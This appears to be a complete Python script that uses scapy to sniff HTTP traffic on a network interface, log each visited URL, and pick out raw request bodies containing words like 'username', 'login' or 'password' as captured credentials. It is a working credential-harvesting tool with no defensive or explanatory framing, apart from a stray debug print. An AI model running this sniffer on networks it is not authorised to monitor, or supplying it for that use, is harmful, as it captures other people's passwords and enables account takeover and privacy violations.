import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    print("a")
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [b"username", b"login", b"uname", b"pass", b"password"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))

        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible Username/password >" + str(login_info) + " \n\n")


sniff("eth0")